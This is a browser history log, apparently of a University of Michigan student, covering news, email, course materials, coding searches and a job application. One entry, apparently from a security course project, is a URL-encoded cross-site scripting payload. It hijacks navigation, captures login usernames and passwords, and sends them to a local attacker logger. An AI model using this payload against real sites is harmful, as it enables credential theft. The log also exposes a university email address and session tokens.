2/9/2015,http://www.businessinsider.com/what-facebook-used-to-look-like-2015-2?utm_content=bufferac080&utm_medium=social&utm_source=facebook.com&utm_campaign=buffer#facebook-launched-the-news-feed-to-display-all-your-friends-activity-in-a-single-timeline-in-2006-6
2/9/2015,http://www.businessinsider.com/what-facebook-used-to-look-like-2015-2?utm_content=bufferac080&utm_medium=social&utm_source=facebook.com&utm_campaign=buffer#at-the-same-time-facebook-introduced-the-mini-feed-but-the-entire-concept-of-a-news-feed-resulted-in-some-very-public-outrage-some-users-even-went-so-far-to-call-one-of-facebooks-product-managers-the-devil-7
2/9/2015,http://www.businessinsider.com/what-facebook-used-to-look-like-2015-2?utm_content=bufferac080&utm_medium=social&utm_source=facebook.com&utm_campaign=buffer#in-2009-facebooks-home-page-got-a-facelift-it-started-to-creep-onto-twitters-territory-with-the-addition-of-a-real-time-news-feed-that-same-year-facebook-also-introduced-its-algorithm-for-determining-the-order-in-which-status-updates-should-be-displayed-8
2/9/2015,http://www.businessinsider.com/what-facebook-used-to-look-like-2015-2?utm_content=bufferac080&utm_medium=social&utm_source=facebook.com&utm_campaign=buffer#in-2010-facebook-brought-notifications-to-the-top-navigation-bar-following-yet-another-redesign-9
2/9/2015,http://www.businessinsider.com/what-facebook-used-to-look-like-2015-2?utm_content=bufferac080&utm_medium=social&utm_source=facebook.com&utm_campaign=buffer#facebook-rolled-out-a-new-more-visual-profile-in-2010-it-added-a-row-of-recently-tagged-images-below-your-name-and-basic-profile-information-10
2/9/2015,http://www.businessinsider.com/what-facebook-used-to-look-like-2015-2?utm_content=bufferac080&utm_medium=social&utm_source=facebook.com&utm_campaign=buffer#facebook-launched-the-news-ticker-in-2011-so-users-could-keep-up-with-their-friends-while-browsing-through-other-parts-of-facebook-11
2/9/2015,http://www.businessinsider.com/what-facebook-used-to-look-like-2015-2?utm_content=bufferac080&utm_medium=social&utm_source=facebook.com&utm_campaign=buffer#the-facebook-timeline-feels-like-its-been-around-since-the-beginning-but-it-launched-in-2011-to-act-as-a-virtual-timeline-of-your-entire-life-12
2/9/2015,http://www.businessinsider.com/what-facebook-used-to-look-like-2015-2?utm_content=bufferac080&utm_medium=social&utm_source=facebook.com&utm_campaign=buffer#facebook-started-flooding-the-news-feed-with-sponsored-stories-in-january-2012-13
2/9/2015,http://www.businessinsider.com/what-facebook-used-to-look-like-2015-2?utm_content=bufferac080&utm_medium=social&utm_source=facebook.com&utm_campaign=buffer#heres-what-facebooks-news-feed-looks-like-today-14
2/9/2015,http://www.businessinsider.com/what-facebook-used-to-look-like-2015-2?utm_content=bufferac080&utm_medium=social&utm_source=facebook.com&utm_campaign=buffer#this-is-what-facebooks-mobile-app-looked-like-when-it-first-launched-15
2/9/2015,http://www.businessinsider.com/what-facebook-used-to-look-like-2015-2?utm_content=bufferac080&utm_medium=social&utm_source=facebook.com&utm_campaign=buffer#it-has-been-completely-redesigned-16
2/9/2015,http://www.businessinsider.com/what-facebook-used-to-look-like-2015-2?utm_content=bufferac080&utm_medium=social&utm_source=facebook.com&utm_campaign=buffer#now-check-out-early-facebook-from-a-different-perspective--17
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6f3dc53db114f
2/9/2015,https://mail.google.com/mail/u/1/#inbox/14b6fbb8fbb845f9
2/9/2015,http://web.eecs.umich.edu/~harshavm/teaching/W15/591/slides/dynamo.pdf
2/9/2015,http://web.eecs.umich.edu/~harshavm/teaching/W15/591/slides/gfs.pdf
2/9/2015,http://web.eecs.umich.edu/~harshavm/teaching/W15/591/slides/fawn.pdf
2/9/2015,http://web.eecs.umich.edu/~harshavm/teaching/W15/591/slides/copysets.pdf
2/9/2015,http://web.eecs.umich.edu/~prabal/teaching/eecs582/
2/9/2015,http://videos.marca.com/v/QkiKffAS2M7-gol-de-pedro-2-5-en-el-athletic-barca.html
2/9/2015,https://mail.google.com/mail/u/0/?pli=1#inbox/14b6f9bc4cdc8165
2/9/2015,https://plus.google.com/u/0/_/notifications/frame?sourceid=49&hl=en&origin=https%3A%2F%2Fdrive.google.com&uc=1&jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.gapi.en.V4LcX4GIySc.O%2Fm%3D__features__%2Fam%3DAAI%2Frt%3Dj%2Fd%3D1%2Frs%3DAItRSTMeAjKAPwkFy_1E-NAjuYKuxXbXEw#pid=49&rpctoken=257244044&_methods=onError%2ConInfo%2ChideNotificationWidget%2CpostSharedMessage%2Creauth%2CsetNotificationWidgetHeight%2CsetNotificationWidgetSize%2CswitchTo%2CnavigateTo%2CsetNotificationText%2CsetNotificationAnimation%2CgetNotificationText%2C_ready%2C_close%2C_open%2C_resizeMe%2C_renderstart&id=I1_1423370125702&parent=https%3A%2F%2Fdrive.google.com&pfname=
2/9/2015,https://plus.google.com/u/1/_/notifications/frame?sourceid=49&hl=en&origin=https%3A%2F%2Fdrive.google.com&uc=1&jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.gapi.en.V4LcX4GIySc.O%2Fm%3D__features__%2Fam%3DAAI%2Frt%3Dj%2Fd%3D1%2Frs%3DAItRSTMeAjKAPwkFy_1E-NAjuYKuxXbXEw#pid=49&rpctoken=392401196&_methods=onError%2ConInfo%2ChideNotificationWidget%2CpostSharedMessage%2Creauth%2CsetNotificationWidgetHeight%2CsetNotificationWidgetSize%2CswitchTo%2CnavigateTo%2CsetNotificationText%2CsetNotificationAnimation%2CgetNotificationText%2C_ready%2C_close%2C_open%2C_resizeMe%2C_renderstart&id=I1_1423370158101&parent=https%3A%2F%2Fdrive.google.com&pfname=
2/9/2015,http://www.sport.es/es/noticias/barca/shakira-pique-presentaron-hijo-sasha-equipo-del-barca-3923457
2/9/2015,https://mail.google.com/mail/u/1/#inbox/14b70957580fc721
2/9/2015,https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=javascript%20don%27t%20reload%20page
2/9/2015,http://stackoverflow.com/questions/9817209/dont-allow-refresh-webpage
2/9/2015,"https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CB4QFjAA&url=http%3A%2F%2Fstackoverflow.com%2Fquestions%2F9817209%2Fdont-allow-refresh-webpage&ei=7j_ZVJqlDcH1UpCTgNgH&usg=AFQjCNE5Sr8YYo28z3ssQkFshoxGx0xGkQ&sig2=DIMi-9-fSQAE5wNL8Jt7yQ&bvm=bv.85464276,d.ZWU&cad=rja"
2/9/2015,"https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=3&ved=0CCwQFjAC&url=http%3A%2F%2Fcodingforums.com%2Fjavascript-programming%2F161182-making-javascript-not-reload-page-after-form-submit.html&ei=7j_ZVJqlDcH1UpCTgNgH&usg=AFQjCNE1B7o2wTyPxmbBTX6ff3w9mMC04g&sig2=o6TntSHZIML6eX4AryhADA&bvm=bv.85464276,d.ZWU&cad=rja"
2/9/2015,http://codingforums.com/javascript-programming/161182-making-javascript-not-reload-page-after-form-submit.html
2/9/2015,http://www.codingforums.com/javascript-programming/161182-making-javascript-not-reload-page-after-form-submit.html
2/9/2015,https://plus.google.com/u/0/_/notifications/frame?sourceid=23&hl=es&origin=https%3A%2F%2Fmail.google.com&uc=1&jsh=m%3B%2F_%2Fscs%2Fabc-static%2F_%2Fjs%2Fk%3Dgapi.gapi.en.V4LcX4GIySc.O%2Fm%3D__features__%2Fam%3DAAI%2Frt%3Dj%2Fd%3D1%2Frs%3DAItRSTMeAjKAPwkFy_1E-NAjuYKuxXbXEw&zx=tt0tzcd18maw#pid=23&rpctoken=184666391&_methods=onError%2ConInfo%2ChideNotificationWidget%2CpostSharedMessage%2Creauth%2CsetNotificationWidgetHeight%2CsetNotificationWidgetSize%2CswitchTo%2CnavigateTo%2CsetNotificationText%2CsetNotificationAnimation%2CgetNotificationText%2C_ready%2C_close%2C_open%2C_resizeMe%2C_renderstart&id=I2_1423237465298&parent=https%3A%2F%2Fmail.google.com&pfname=
2/9/2015,http://stackoverflow.com/questions/5010831/dont-reload-page-when-submitting-form-without-jquery
2/9/2015,"https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=4&ved=0CDMQFjAD&url=http%3A%2F%2Fstackoverflow.com%2Fquestions%2F5010831%2Fdont-reload-page-when-submitting-form-without-jquery&ei=7j_ZVJqlDcH1UpCTgNgH&usg=AFQjCNFB-dMeu8H7wEXj7jRgh-ctaKV3EQ&sig2=R5yo3WkZAeePqms3e4dGew&bvm=bv.85464276,d.ZWU&cad=rja"
2/9/2015,"https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=5&ved=0CDoQFjAE&url=http%3A%2F%2Fwww.webmasterworld.com%2Fjavascript%2F3899100.htm&ei=7j_ZVJqlDcH1UpCTgNgH&usg=AFQjCNGLjr-ynwL0NRRtMDZwA8lZoMBuTw&sig2=AL3Gh0QZ8jRkqWT95XCTWQ&bvm=bv.85464276,d.ZWU&cad=rja"
2/9/2015,http://www.webmasterworld.com/javascript/3899100.htm
2/9/2015,https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=post%20jquery
2/9/2015,https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=post+jquery+form+data
2/9/2015,http://api.jquery.com/jquery.post/
2/9/2015,https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=1&ved=0CB4QFjAA&url=http%3A%2F%2Fapi.jquery.com%2Fjquery.post%2F&ei=OUTZVIWAEoatPIXTgfAP&usg=AFQjCNHj_9LoHYOgAYhHmsWsJPdzyDoGXA&sig2=yOeI9vZLLsJOwQjdSm-27A&cad=rja
2/9/2015,http://stackoverflow.com/questions/13750294/jquery-formdata-post-for-file-upload
2/9/2015,https://www.google.com/url?sa=t&rct=j&q=&esrc=s&source=web&cd=3&ved=0CCoQFjAC&url=http%3A%2F%2Fstackoverflow.com%2Fquestions%2F13750294%2Fjquery-formdata-post-for-file-upload&ei=OUTZVIWAEoatPIXTgfAP&usg=AFQjCNFaUuD2DS-5lf5fuacC9e5roeuEQg&sig2=LRRVbM_qFSjNEYst9wp8BQ&cad=rja
2/9/2015,https://mail.google.com/mail/u/1/#apps/bradmw%40umich.edu/n50
2/9/2015,https://mail.google.com/mail/u/1/#apps/bradmw%40umich.edu/n50/14b50aa2d2da96b7?projector=1
2/9/2015,https://mail.google.com/mail/u/1/#apps/bradmw%40umich.edu/n50/14b50aa2d2da96b7
2/9/2015,https://weblogin.umich.edu/?cosign-www&https://www.umich.edu/~eecs183/#tutoring
2/9/2015,https://www.google.com/calendar/render#h
2/9/2015,http://www.mathworks.com/help/matlab/ref/matlabroot.html?refresh=true
2/9/2015,http://web.eecs.umich.edu/~harshavm/teaching/W15/591/papers/coda.pdf
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b709b3ce91164d
2/9/2015,https://mail.google.com/mail/u/0/#inbox?compose=14b70bb461e6c13d
2/9/2015,https://mail.google.com/mail/u/0/#inbox?compose=14b70bad0db69157
2/9/2015,https://mail.google.com/mail/u/0/#inbox?compose=14b70bab853a9159
2/9/2015,https://mcommunity.umich.edu/mcPeopleService/cosign/valid?cosign-webdirectory.mc.itd=eQV06nBiijs9uGO4TsTgYah5pCWER2x2cEHNhr8UXVkZXf-OW6GFvEcmqpzi5ITdLc1NdlV0Ndj2Jbv9ZhFxEcc9FvYqN+bB4voBkkDovJXOV0q31X+oZzOR6haY&https://mcommunity.umich.edu/
2/9/2015,https://mail.google.com/mail/u/0/#inbox?compose=14b70bba291eb947
2/9/2015,https://mail.google.com/mail/u/0/#inbox?compose=14b70bb7b0158477
2/9/2015,http://learn.jquery.com/ajax/
2/9/2015,https://www.owasp.org/index.php/Cross-Site_Request_Forgery_%28CSRF%29_Prevention_Cheat_Sheet
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b707973a20fc19
2/9/2015,https://csprod.dsc.umich.edu/cosign/valid?cosign-csprod.dsc=6-ngeLG5z9iCvI5LRd0T7O9ShZCkrPSI3aPC0g8wGn-5YjsBK6Uk786fF9JtyXOG0KP6pvon2kJa5eHgG1VhzbssZ9GCsfooawHHY-h1GJeVwpbOty0mc+EOnXhO&https://csprod.dsc.umich.edu/psp/csprodnonop/EMPLOYEE/HRMS/s/WEBLIB_PTPP_SC.HOMEPAGE.FieldFormula.IScript_AppHP?pt_fname=CO_EMPLOYEE_SELF_SERVICE&FolderPath=PORTAL_ROOT_OBJECT.CO_EMPLOYEE_SELF_SERVICE&IsFolder=true&authType=0S
2/9/2015,http://eecs388.org/project2/search?q=%3Ca+href%3D%22https%3A%2F%2Fwww.google.com%2F%3Fgws_rd%3Dssl%22%3EClick+Here%3C%2Fa%3E
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70ca8ff0ae9b6
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70ca58862b569
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70ca3b4b86f17
2/9/2015,https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=wes%20felter
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cb43af6ecd6
2/9/2015,file:///Users/luis/dev/um/eecs388/p2/project2/xss_payload.html
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70ccaf4f4651a
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cc456aa3467
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cc23194d0d6
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cc087cbfd66
2/9/2015,https://talkgadget.google.com/u/0/talkgadget/_/chat?client=sm&prop=homepage&nav=true&fid=gtn-roster-iframe-id&os=MacIntel&stime=1422939102681&xpc=%7B%22cn%22%3A%22o8pkd5%22%2C%22tp%22%3A1%2C%22ifrid%22%3A%22gtn-roster-iframe-id%22%2C%22pu%22%3A%22https%3A%2F%2Ftalkgadget.google.com%2Fu%2F0%2Ftalkgadget%2F_%2F%22%7D&ec=%5B%22ci%3Aec%22%2Ctrue%2Ctrue%2Cfalse%5D&pvt=AMP3uWbP2qhuPMKKoGv8VgLEU9nvtJvb41bFJ_ARsfbdk6SBsxqNa-8xyCpHu55YV-OSHfbX3tNk&href=https%3A%2F%2Fplus.google.com%2Fu%2F0%2F107578967613590754451%2Fposts%2FgAj4ifaFHc8%3Frel%3D1%26cfem%3D1&pos=l&uiv=2&hl=en&hpc=true&hsm=true&hrc=true&uqp=false&sl=false&mmoleh=36&two=https%3A%2F%2Fplus.google.com&host=1&zx=0.5230928747914732
2/9/2015,https://www.google.com/webhp?sourceid=chrome-instant&ion=1&espv=2&ie=UTF-8#q=resume
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cd6e45aad46
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cd46c6e4f96
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cd16933b7b1
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70ccf464db2a4
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70ce05779cdc0
2/9/2015,http://eecs388.org/project2/search?xssdefense=0&q=%3Cscript%3Efunction%20payload(attacker)%20%7B%0A%20%20%20%20attacker%20%3D%20str(%2Fhttp%3A%2F)%20%2B%20chr(47)%20%2B%20chr(47)%20%2B%20str(attacker)%0A%20%20%20%20var%20username%20%3D%20String()%0A%20%20%20%20%2F%2F%20hijack%20back%20button%0A%20%20%20%20window.addEventListener(str(%2Fpopstate%2F)%2C%20function%20(e)%20%7B%0A%20%20%20%20%20%20%20%20navigate_to(e.state)%0A%20%20%20%20%20%20%20%20return%20true%0A%20%20%20%20%7D)%0A%20%20%20%20%2F%2F%20hijack%20forward%20button%0A%20%20%20%20window.addEventListener(str(%2Fpushstate%2F)%2C%20function%20(e)%20%7B%0A%20%20%20%20%20%20%20%20navigate_to(e.state)%0A%20%20%20%20%20%20%20%20return%20true%0A%20%20%20%20%7D)%0A%20%20%20%20function%20log(data)%20%7B%0A%20%20%20%20%20%20%20%20%24.get(attacker%2C%20data)%0A%20%20%20%20%7D%0A%20%20%20%20function%20navigate_to(href)%20%7B%0A%20%20%20%20%20%20%20%20%24(str(%2Fhtml%2F)).load(href%2C%20function%20()%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20log_data%20%3D%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event%3A%20str(%2Fnav%2F)%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20url%3A%20href%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(username.length%20%3E%200)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log_data.user%20%3D%20username%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20log(log_data)%0A%20%20%20%20%20%20%20%20%20%20%20%20hijack_navigation()%0A%20%20%20%20%20%20%20%20%20%20%20%20clean_search_history()%0A%20%20%20%20%20%20%20%20%20%20%20%20%24(str(%2Fhtml%2F)).show()%0A%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%7D%0A%20%20%20%20function%20proxy(href)%20%7B%0A%20%20%20%20%20%20%20%20navigate_to(href)%0A%20%20%20%20%20%20%20%20history.pushState(href%2C%20null%2C%20href)%0A%20%20%20%20%7D%0A%20%20%20%20function%20str(re)%20%7B%0A%20%20%20%20%20%20%20%20var%20re_str%20%3D%20re.toString()%0A%20%20%20%20%20%20%20%20return%20re_str.substring(1%2C%20re_str.length%20-%201)%0A%20%20%20%20%7D%0A%20%20%20%20function%20chr(code)%20%7B%0A%20%20%20%20%20%20%20%20return%20String.fromCharCode(code)%0A%20%20%20%20%7D%0A%20%20%20%20function%20form_selector(re)%20%7B%0A%20%20%20%20%20%20%20%20return%20str(%2Fform%2F)%20%2B%20chr(91)%20%2B%20str(%2Faction%3D%2F)%20%2B%20chr(34)%20%2B%20chr(46)%20%2B%20chr(47)%20%2B%20str(re)%20%2B%20chr(34)%20%2B%20chr(93)%0A%20%20%20%20%7D%0A%20%20%20%20function%20hijack_navigation()%20%7B%0A%20%20%20%20%20%20%20%20%2F%2F%20hijack%20normal%20anchor%20tags%0A%20%20%20%20%20%20%20%20%24(str(%2Fa%2F)).on(str(%2Fclick%2F)%2C%20function%20(e)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(%24(this).attr(str(%2Fhref%2F)))%0A%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%24(form_selector(%2Fsearch%2F)).on(str(%2Fsubmit%2F)%2C%20function%20(e)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%0A%20%20%20%20%20%20%20%20%20%20%20%20proxy(%24(this).attr(str(%2Faction%2F))%20%2B%20chr(63)%20%2B%20str(%2Fq%3D%2F)%20%2B%20encodeURIComponent(%24(str(%2F%23query%2F)).val()))%0A%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%2F%2F%20hijack%20login%20form%0A%20%20%20%20%20%20%20%20%24(form_selector(%2Flogin%2F)).on(str(%2Fsubmit%2F)%2C%20function%20(e)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20same%20form%20used%20to%20create%20an%20account%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20submitAction%20%3D%20%24(e.originalEvent.explicitOriginalTarget).attr(str(%2Fformaction%2F))%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20action%20%3D%20submitAction%20%7C%7C%20%24(this).attr(str(%2Faction%2F))%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20username%20%3D%20%24(str(%2F%23username%2F)).val()%0A%20%20%20%20%20%20%20%20%20%20%20%20var%20password%20%3D%20%24(str(%2F%23userpass%2F)).val()%0A%20%20%20%20%20%20%20%20%20%20%20%20%24.ajax(%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20type%3A%20str(%2FPOST%2F)%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20url%3A%20action%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20data%3A%20%24(this).serialize()%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20success%3A%20function%20(data%2C%20status)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%2F%2F%20log%20both%20create%20and%20login%20events%20as%20logins%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event%3A%20str(%2Flogin%2F)%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20user%3A%20username%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20password%3A%20password%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(location.pathname)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20error%3A%20function%20(jqXHR%2C%20status%2C%20err)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log(status%20%2B%20err)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%2F%2F%20hijack%20logout%20form%0A%20%20%20%20%20%20%20%20%24(form_selector(%2Flogout%2F)).on(str(%2Fsubmit%2F)%2C%20function%20(e)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20e.preventDefault()%0A%0A%20%20%20%20%20%20%20%20%20%20%20%20%24.ajax(%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20type%3A%20str(%2FPOST%2F)%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20url%3A%20%24(this).attr(str(%2Faction%2F))%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20data%3A%20%24(this).serialize()%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20success%3A%20function%20(data%2C%20status)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20log(%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20event%3A%20str(%2Flogout%2F)%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20user%3A%20username%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20username%20%3D%20String()%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20proxy(chr(46)%20%2B%20chr(47))%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%2C%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20error%3A%20function%20(jqXHR%2C%20status%2C%20err)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20console.log(status%20%2B%20err)%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%7D%0A%0A%20%20%20%20function%20clean_search_history%20()%20%7B%0A%20%20%20%20%20%20%20%20%24(str(%2F%23history-list%20a%2F)).each(function%20(i)%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20if%20(%24(this).text().match(%2Ffunction%20payload%2F))%20%7B%0A%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%24(this).hide()%0A%20%20%20%20%20%20%20%20%20%20%20%20%7D%0A%20%20%20%20%20%20%20%20%7D)%0A%20%20%20%20%7D%0A%20%20%20%20%24(str(%2Fhtml%2F)).hide()%3B%0A%20%20%20%20proxy(chr(46)%20%2B%20chr(47))%3B%0A%7D%0Apayload(%2F127.0.0.1%3A31337%2F)%3C%2Fscript%3E
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cf63cee9dd9
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cf4cd506f8d
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=new
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cef108e964f
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70ceda42f9a37
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cebf3128952
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cea585431c5
2/9/2015,https://jobs3.netmedia1.com/cp/job_summary.jsp?job_id=RES-0714483
2/9/2015,https://jobs3.netmedia1.com/cp/faces/job_summary?job_id=RES-0714483
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70d0101b65bb5
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cfdc8fc3f87
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cfb127fbd21
2/9/2015,https://mail.google.com/mail/u/0/#inbox/14b6e88abb55d482?compose=14b70cf987f374fd
2/9/2015,https://jobs3.netmedia1.com/cp/faces/job_summary
2/9/2015,https://csprod.dsc.umich.edu/cosign/valid?cosign-csprod.dsc=5NzAk3e1EVJqNlE3GIAcrSNqyxEh8KbZ15IeoBAKCKiGKThw9tndTenadzSSCwJgezTE0HXMPu2GcfHphvjUsmYc-nmpWWxR0iLws9PoS0YEi+YzlHRfJiUDNMtf&https://csprod.dsc.umich.edu/psp/csprodnonop/EMPLOYEE/HRMS/s/WEBLIB_PTPP_SC.HOMEPAGE.FieldFormula.IScript_AppHP?pt_fname=CO_EMPLOYEE_SELF_SERVICE&FolderPath=PORTAL_ROOT_OBJECT.CO_EMPLOYEE_SELF_SERVICE&IsFolder=true&authType=0S
2/9/2015,https://mail.google.com/mail/u/1/#inbox/14b7075111deb88d
2/9/2015,https://jobs3.netmedia1.com/cp/faces/registration
2/9/2015,https://jobs3.netmedia1.com/cp/servlet/upload_cv_Controller?ood_id=&application_id=&all_docs_id=&all_docs=&_file_name=LisaDionResume.pdf
2/9/2015,https://jobs3.netmedia1.com/cp/faces/faces/upload?close=true&uploaded_file=LisaDionResume_%7EwkiP1yxEZn.pdf
2/9/2015,https://jobs3.netmedia1.com/cp/faces/upload?language_id=2&country_id=50
